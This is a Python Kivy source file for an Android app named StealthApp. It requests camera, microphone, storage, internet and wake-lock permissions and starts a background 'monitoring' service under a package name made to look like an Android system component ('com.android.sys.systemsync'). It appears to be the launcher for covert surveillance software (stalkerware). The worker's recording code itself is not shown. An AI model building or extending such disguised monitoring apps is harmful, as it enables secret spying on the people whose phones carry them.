from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.utils import platform

class StealthApp(App):
    def build(self):
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            request_permissions([
                Permission.CAMERA,
                Permission.INTERNET,
                Permission.FOREGROUND_SERVICE,
                Permission.WAKE_LOCK,
                Permission.WRITE_EXTERNAL_STORAGE,
                Permission.READ_EXTERNAL_STORAGE,
                Permission.RECORD_AUDIO,
            ])
            self.start_foreground_service()

        layout = BoxLayout(orientation='vertical')
        layout.add_widget(Label(
            text="Kuzatuv xizmati faollashdi.\nIlovani yopishingiz mumkin\n(Orqa fonda ishlaydi)."
        ))
        return layout

    def start_foreground_service(self):
        try:
            from jnius import autoclass
            mActivity = autoclass('org.kivy.android.PythonActivity').mActivity
            # buildozer.spec: package.domain=com.android.sys, package.name=systemsync, services=worker:...
            service_name = "com.android.sys.systemsync.ServiceWorker"
            context = mActivity.getApplicationContext()
            service_class = autoclass(service_name)
            intent = autoclass('android.content.Intent')(context, service_class)
            intent.putExtra("pythonServiceArgument", "")
            if autoclass('android.os.Build$VERSION').SDK_INT >= 26:
                mActivity.startForegroundService(intent)
            else:
                mActivity.startService(intent)
        except Exception as e:
            print(f"Xizmatni ishga tushirishda xatolik: {e}")

if __name__ == '__main__':
    StealthApp().run()
